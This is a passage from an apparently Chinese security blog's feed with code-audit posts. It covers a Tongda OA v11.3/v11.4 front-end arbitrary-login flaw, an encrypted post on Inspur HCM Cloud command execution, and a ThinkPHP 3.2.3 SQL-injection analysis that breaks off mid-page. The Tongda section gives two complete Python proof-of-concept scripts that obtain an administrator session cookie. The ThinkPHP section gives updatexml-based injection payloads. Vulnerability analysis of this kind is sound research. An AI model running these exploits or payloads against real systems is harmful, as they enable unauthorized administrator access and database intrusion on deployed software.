class="string">&quot;inc/TRedis/TRedis.php&quot;</span>;</span><br><span class="line"><span class="variable">$redis</span> = <span class="title class_">TRedis</span>::<span class="title function_ invoke__">redis</span>();</span><br><span class="line"><span class="variable">$UID</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;UID&quot;</span>]);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$PARA_ARRAY</span> = <span class="title function_ invoke__">get_sys_para</span>(<span class="string">&quot;SEC_PASS_FLAG,SEC_PASS_TIME,SEC_RETRY_BAN,SEC_RETRY_TIMES,SEC_BAN_TIME,SEC_USER_MEM,SEC_KEY_USER,LOGIN_KEY,SEC_ON_STATUS,SEC_INIT_PASS,LOGIN_SECURE_KEY,LOGIN_USE_DOMAIN,DOMAIN_SYNC_CONFIG,ONE_USER_MUL_LOGIN,IS_CPDA_BYIP,USE_DISCUZ,OA_URL,WEBROOT,DEFAULT_ATTACH_PATH,MOBILE_PC_OPTION,TD_UNIQID&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">list</span>(<span class="variable">$PARA_NAME</span>, <span class="variable">$PARA_VALUE</span>) = <span class="title function_ invoke__">each</span>(<span class="variable">$PARA_ARRAY</span>)) &#123;</span><br><span class="line"><span class="variable">$PARA_NAME</span> = <span class="variable">$PARA_VALUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * from USER where UID=&#x27;<span class="subst">$UID</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$cursor</span> = <span class="title function_ invoke__">exequery</span>(TD::<span class="title function_ invoke__">conn</span>(), <span class="variable">$query</span>);</span><br><span class="line">..........</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ROW</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$cursor</span>)) &#123;</span><br><span class="line"><span class="variable">$SECURE_KEY_SN</span> = <span class="variable">$ROW</span>[<span class="string">&quot;SECURE_KEY_SN&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_NAME&quot;</span>] = <span class="variable">$LOGIN_USER_NAME</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_PRIV&quot;</span>] = <span class="variable">$LOGIN_USER_PRIV</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_PRIV_OTHER&quot;</span>] = <span class="variable">$LOGIN_USER_PRIV_OTHER</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_SYS_ADMIN&quot;</span>] = ((<span class="variable">$LOGIN_USER_PRIV</span> == <span class="string">&quot;1&quot;</span>) || <span class="title function_ invoke__">find_id</span>(<span class="variable">$LOGIN_USER_PRIV_OTHER</span>, <span class="string">&quot;1&quot;</span>) ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_DEPT_ID&quot;</span>] = <span class="variable">$LOGIN_DEPT_ID</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_DEPT_ID_OTHER&quot;</span>] = <span class="variable">$LOGIN_DEPT_ID_OTHER</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_AVATAR&quot;</span>] = <span class="variable">$LOGIN_AVATAR</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_THEME&quot;</span>] = <span class="variable">$LOGIN_THEME</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_FUNC_STR&quot;</span>] = <span class="variable">$LOGIN_FUNC_STR</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_NOT_VIEW_USER&quot;</span>] = <span class="variable">$LOGIN_NOT_VIEW_USER</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_ANOTHER&quot;</span>] = <span class="variable">$LOGIN_ANOTHER</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_DEPT_ID_JUNIOR&quot;</span>] = <span class="variable">$LOGIN_DEPT_ID_JUNIOR</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_CLIENT&quot;</span>] = <span class="variable">$LOGIN_CLIENT</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_SEX&quot;</span>] = <span class="variable">$LOGIN_USER_SEX</span>;</span><br></pre></td></tr></table></figure><p>在Line <code>12</code>行获取了<code>UID</code>参数，然后竟然直接带入到了20行的sql语句查询，后续没有对权限的验证处理在Line <code>180-196</code>就保存到了<code>SESSION</code>中。<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /logincheck_code.php</span><br><span class="line">    UID=1</span><br></pre></td></tr></table></figure><p>即可获取到<code>cookie</code>，替换当前<code>cookie</code>即可登陆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getV11Session</span>(<span class="params">url</span>):</span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/general/login_code.php&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(checkUrl)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span></span><br><span class="line">        getSessUrl = url+<span class="string">&#x27;/logincheck_code.php&#x27;</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123; <span class="string">&#x27;UID&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>)&#125;,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span>+res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getV11Session(<span class="string">&quot;http://xxxxx/&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/tWEwnv4iMmdR3Ux.jpg"                                        ></p><p>替换<code>cookie</code>访问<code>/general/index.php</code>即可<br><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/5ebGC7sHZJQXL9S.jpg"                                        ><br>在v2017 2018.06.xxx版本中同样是可用的</p><h3 id="v11-4"><a href="#v11-4" class="headerlink" title="v11.4"></a>v11.4</h3><p>相比于v11.3，11.4在<code>logincheck_code.php</code>中的<code>Line15-19</code>加入了验证判断</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/P1pqdTRWXkrQx7H.jpg"                                        ><br><code>Line14</code>中<code>login_codeuid</code>变量来于<code>TD::get_cache</code>，只要能够绕过此处的验证即可和v11.3中一样利用。<br>要绕过的条件：</p><ol><li>获取<code>CODEUID</code></li><li>设置cache<code>&quot;CODE_LOGIN&quot; . $CODEUID</code></li></ol><p>搜索<code>TD::get_cache</code>发现<code>general/login_code.php</code>进行了此操作</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/siAeJycD6I5PKzt.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/MKek4TgINDm6dL8.jpg"                                        ></p><p>这里获取到<code>codeuid</code>后直接再post数据到<code>logincheck_code.php</code>即可<br><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/hsoOXHTvcZRUk5b.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/vFl2A3drORjeDCE.jpg"                                        ><br>替换cookie登录即可</p><p>同样在<code>ispirit/login_code_check.php</code>、<code>general/login_code_scan.php</code>、<code>ispirit/login_code.php</code>三个个文件也可以结合利用</p><p><code>ispirit/login_code_check.php</code>:<br><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/4UzTb8WgsSaAwVv.jpg"                                        ><br><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/c4rNRKOnCyPxG8B.jpg"                                        ></p><p><code>Line 5-6</code>获取<code>codeuid</code>和<code>login_codeuid</code>这里的cache类型为<code>CODE_LOGIN_PC</code>且type为<code>confirm</code>才可进入到<code>Line 193-209</code>的设置<code>SESSION</code>流程。</p><p><code>general/login_code_scan.php</code>:<br><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/MojyiFZPCaNu1ld.jpg"                                        ><br>最后缺少的就是<code>codeuid</code>的获取，恰好在<code>ispirit/login_code.php</code>中输出了<code>codeuid</code></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/BRbL6Euxi4nWyrf.jpg"                                        ></p><p>梳理下流程：</p><ol><li>进入<code>ispirit/login_code.php</code>获取<code>codeuid</code></li><li>使用获取的<code>codeuid</code>进入<code>general/login_code_scan.php</code>设置type为<code>confirm</code></li><li>使用<code>codeuid</code>进入<code>ispirit/login_code_check.php</code></li></ol><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/ZRvLPbwVf9oK6Bi.jpg"                                        ></p><p>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSession</span>(<span class="params">url</span>):</span><br><span class="line">    vulUrl = url+<span class="string">&#x27;/ispirit/login_code.php&#x27;</span></span><br><span class="line">    res = requests.get(vulUrl)</span><br><span class="line">    codeuid = json.loads(res.text)[<span class="string">&#x27;codeuid&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(codeuid)</span><br><span class="line">    confirmUrl = url + <span class="string">&#x27;/general/login_code_scan.php&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;codeuid&#x27;</span>:codeuid,</span><br><span class="line">        <span class="string">&#x27;uid&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>),</span><br><span class="line">        <span class="string">&#x27;source&#x27;</span>: <span class="string">&#x27;pc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;confirm&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(confirmUrl,data=data)</span><br><span class="line">    status = json.loads(res.text)[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(status)</span><br><span class="line">    <span class="keyword">if</span> status == <span class="built_in">str</span>(<span class="number">1</span>):</span><br><span class="line">        seesionUrl = url + <span class="string">&#x27;/ispirit/login_code_check.php?codeuid=&#x27;</span>+codeuid</span><br><span class="line">        res = requests.get(seesionUrl)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*]cookie:&#x27;</span>+res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getSession(<span class="string">&#x27;http://xxxx/&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2020/04/24/5Y1qgD4JWaXuS8p.jpg"                                        ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;  通达OA又爆出前台任意用户登录漏洞，此CMS的漏洞还是挺多的，此次的漏洞有很多版本差异。&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浪潮HCM Cloud 命令执行</title>
    <link href="http://example.com/2020/03/21/%E6%B5%AA%E6%BD%AEHCM-Cloud-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2020/03/21/%E6%B5%AA%E6%BD%AEHCM-Cloud-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-03-21T14:53:27.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="274a6abd4c534f63a74fd362fc190bd6766c2f0edbce3ca615c083dfbb865dfb">4fb3d45e54deadd9aab1c3fab00ecedc82b1049d65120066d96f265acb3a84a7ea314bb16307794b0abefd9f292f156727ecfc0207666a652b4cb024c2d74c09adca13894fa4f288f264676705e88a886b501d3be96e80db7c0c33ef6a0e4c52cea62c36a972ebfb00f18b7305919019c58cd90781db402c3f1b7561584322266dc64f8efdef2849414897d495938bfd13dfc7d2955fe413ee0e03b4143444c78a9dca68bd19d4ef91a11cf4ac75e7e3c96847f7a7376842112c1340226f3c05701d706cd28604f1716690c79d0f63ea64492f9f26a8f7f0ec18776e4911ed21f95720df73d5072622cab505dcd5df85498b1b714b4e83ec8ce94423f728d83bfd060b95e31ce3e47260a2d2f44e46b6e78c82587c4edaae08f6190cb1ed7a009791565d4d4b888eef317b91a83779f5858ccfcab314a0a346699b0a15da62108b7f7791cd2c358fe1cfb284919f355cbe4977ec7358fe3cccc1557c24deb7a3e7f544897ed268fd0a66579dbf780f647bcb9b9e6e8f1037277745ad199c763bc02121d6def3dbbac005fbbad6b2f871757b935dd5a8d7a98b406fb913677c21524470c4398a9a3e0a953fde437ddaddcec7bcf909584f3f504487ded5bc9bd96377ee3afa84420911eaf2639f72a98c070a6fde44583625af0e09ce0078b8406d76f5ad120d77add4603b5944bf9f20283b5ca1f042569021c1cf6bc820ffd98bbb5a06aaca9e6f828708e7a32f518b87f406f46881de9ebb1109d5eff8796ef092a04db884495f33336089df7a133513cdc51d05e3a376bef8b65e115042425f6e097e65ecb1a7b2996c99788c6fe7e48c1f2ac91d3d3037a2511d2f2e83e6f50e631139f2e303ce85f6c9aae7ca7070bbe4b0c3647a7c17b1379dc72be0061688a868f55f8d95b6b933506dfda3f0510b2dcfd63835c9c1c9e3e7a66c9b42603508264f9c7815c0520a7b5dfc098211931695c426f2b15f4e0d23b786228fda724eec0411e45251ee09caff62f42d8a342ad591281658c56d2305a434e49e3dfb7353c236db6a2669bc885467e6705a4355b37387b1a2dd27108721f00b2829139b99b3598b82327798e0f893abde3ade5a1d94a050dbc457c73877ebf1d6e7835e02cb6a053d85ff80ebcaacbce9173a2ed113f40fea0f30b73bea7e51a3c8a8bc5b32a69d89e740cfc20328c53164a4b4de0fa6b068b7cf9d8a1a595564c4f285984f91eebfd6198604fec4f5255448c60fd88423cdb004e1f18754fe0697a3ab3502299ff5eee0729610251d954f04a9bcd37b52775a96dd26b20156add41cb25999075c3986f96d3a414ea551567d2478b7aa5329b16d6eab4ad894047726f6911b0403b88fb6d09a6e1286059a115fe7dc7ee9b7f25cc7e8af91dda4e935db644a5ed55734793ba9eebe756977b64438b4c936f19eb568af6e1a31461e9635368c924d4c4485aa85140bb4d239e6e98a6beceb46f602134807ae59a6467ecf18e0c2477cb529993dd11164575618057d4a2cd7473878119d170be008c0046b6ab3c4b6838f609f82a4d6c6c1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计入门篇三——Thinkphp框架篇</title>
    <link href="http://example.com/2019/09/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%AF%87%E4%B8%89%E2%80%94%E2%80%94Thinkphp%E6%A1%86%E6%9E%B6%E7%AF%87/"/>
    <id>http://example.com/2019/09/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%AF%87%E4%B8%89%E2%80%94%E2%80%94Thinkphp%E6%A1%86%E6%9E%B6%E7%AF%87/</id>
    <published>2019-09-01T14:11:30.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ThinkPHP3-2-3-SQL注入分析"><a href="#ThinkPHP3-2-3-SQL注入分析" class="headerlink" title="ThinkPHP3.2.3 SQL注入分析"></a>ThinkPHP3.2.3 SQL注入分析</h2><h3 id="0x1-Bind、exp注入"><a href="#0x1-Bind、exp注入" class="headerlink" title="0x1 Bind、exp注入"></a>0x1 Bind、exp注入</h3><p>exp：<code>?name[]=123&amp;pass=123&amp;id[]=bind&amp;id[]=0%20and%20updatexml(1,concat(0x7,(select%20user()),0x7e),1)</code></p><p><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/jbupn1c0t50fhtqka3bs.jpg"                                        ></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//IndexController.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;pass&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line">        <span class="comment">//更新数据</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$user</span>)-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="comment">//查询出所有数据</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/hqxztls1hrsp2pnqcu0u.jpg"                                        ><br><code>       $result = $User-&gt;where($user)-&gt;save($data);</code>先进入where函数执行如下流程</p><ol><li>判断传入的第一个<code>$where</code>参数是数组和第二个参数是否为空，满足条件就进行转义 否侧进入下个分支</li><li>判断是否时对象</li><li>判断<code>$where</code>是否时字符类型，并且为空</li><li>判断<code>$this-&gt;options[&#39;where&#39;]</code>是否存在 否则将<code>$where</code>赋值给<code>$this-&gt;options[&#39;where&#39;]</code></li></ol><p>我们传入的<code>id</code>是一个数组，没有进行处理直接赋值给了<code>$this-&gt;options[&#39;where&#39;]</code><br>接下来进入到save函数，经过数据处理进入<code>_parseOptions</code>函数<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/mbx9h9zvxbwcdmzuwfq9.jpg"                                        ></p><p><code>_parseOptions</code>函数获取了数据表名，别名等信息然后进入到了update方法<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/cqcrixrkoc6nsg6m8u7j.jpg"                                        ></p><p>接着进入<code>parseWhere</code>函数<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/ihzalyiypsrhrmamutax.jpg"                                        ><br>定义了运算条件后进入<code>parseWhereItem</code><br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/fzwwwfyed4bvtjlcdhz1.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/vtufcxcijuz8beli4i3h.jpg"                                        ><br>可以看到 <code>$exp=val[0]=bind</code>,当<code>$exp == &#39;bind&#39;</code>的时候会将<code>$key和val[1]</code>拼接起来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wherestr</span> = <span class="string">&quot;`id` = :0 and updatexml(1,concat(0x7,(select user()),0x7e),1)&quot;</span></span><br></pre></td></tr></table></figure><p>接下来的问题就是=后面的<code>:</code>是怎么去除的,现在的sql是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `user` SET `pass`=:<span class="number">0</span> WHERE `id` = :<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7</span>,(select <span class="title function_ invoke__">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/tjwl6g9p1bcj6x5otsuh.jpg"                                        ><br>在这里看到将占位符替换为了bind[‘:0’]中的内容<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/hom7b4uxpnh2wn0k4jvz.jpg"                                        ></p><p>由此产生了注入<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/xbd1sm70eik3lqxfhdj0.jpg"                                        ></p><p>当然也可以是id[0]为exp<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/ikoe9xdunezblyw4tx88.jpg"                                        ></p><h3 id="0x2-where注入"><a href="#0x2-where注入" class="headerlink" title="0x2 where注入"></a>0x2 where注入</h3><p>poc:<code>id[where]=1%20and%201=updatexml(1,concat(0x7,(select%20user()),0x7e),1)%23</code><br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/wpgd2zs81azgpf4ymeaj.jpg"                                        ></p><p>demo:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$id</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>首先在第8行断点，再来执行下poc<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/vlgy3vrgyfhr6dxgwerd.jpg"                                        ><br>可以看到传入的id是一个数组里面键为<code>where</code>值为我们传入的注入语句，这里又是怎么将sql语句带入到数据库查询到呢，我们继续向下看执行的流程<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/llsscf4ioonwy3fbfmds.jpg"                                        ><br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/rietqcmgt7vjcgolopa3.jpg"                                        ></p><p>然后进入了<code>options_filter</code>表达式过滤函数<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/w1qtplx9mxmgexsfqgvd.jpg"                                        ><br>可以发现没有进行任何处理接着向下进行 直到<code>parseSql</code>函数中的<code>parseWhere</code><br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/dhghcbqb61ewedazgplh.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/glktj7apx4znusjdnliu.jpg"                                        ></p><p>然后直接返回了<code> &#39;WHERE&#39; .$whereStr</code><br><img                         lazyload                       alt="image"                       